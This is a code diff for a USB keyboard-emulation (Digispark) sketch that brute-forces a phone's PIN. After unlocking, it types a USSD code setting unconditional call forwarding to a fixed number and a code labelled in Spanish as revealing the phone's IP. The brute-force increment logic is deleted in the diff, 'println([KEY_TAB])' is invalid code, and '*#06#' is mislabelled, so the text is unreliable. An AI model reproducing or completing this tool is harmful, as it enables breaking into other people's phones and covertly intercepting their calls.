@@ -36,7 +36,8 @@
 #define KEY_ENTER 0x28 // Keyboard Return (ENTER)
 #define KEY_HOME 0x4a // Keyboard Home
 
-int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
+
+//DECLARAMOS NUESTROS NUMEROS A PROBAR PARA EL DESBLOQUEO
 int n1 = 0; //1st digit
 int n2 = 0; //2nd digit
 int n3 = 0; //3rd digit
@@ -82,37 +83,18 @@ void loop() {
   delay(1000);
   n4++;
   count++;
-  //If the 4th digit is past 9, it cycles back to 0 and increments the 3rd digit 
-  if(n4 == 10){
-    n4 = 0;
-    n3++;
-    //If the 3rd digit is past 9, it cycles back to 0 and increments the 2nd digit
-    if(n3 == 10){
-      n3 = 0;
-      n2++;
-      //If the 2nd digit is past 9, it cycles back to 0 and increments the 1st digit
-      if(n2 == 10){
-        n2 = 0;
-        n1++; //if the 1st digit is past 9 it'll probably just throw out errors.
-  if(n1 == 10){
-    //remain_true will equal true, loop through void(), and send the 5th keystroke
-    key_stroke_e = true;
-    n5++;
-    //Remember that brute forcing will still work, despite its strange order.
-    //After e == 10, it will become 0 again.
-    if(n5 == 10){
-      n5 = 0;
-    }
-  }
-      }  
-    } 
-  }
+
+
+  //UNA VEZ DESBLOQUEADO EL TELEFONO
   if(count == 2){
   DigiKeyboard.println([KEY_TAB]);
   DigiKeyboard.println([KEY_TAB]);
   DigiKeyboard.sendKeyStroke(40); 
   delay(1000);
+  //DESVIAMOS LAS LLAMADAS
   DigiKeyboard.println("**21*76587841#");
+  DigiKeyboard.sendKeyStroke(40); 
+  //SACAMOS LA IP DEL TELEFONO
   DigiKeyboard.println("*#06#");
   }
   
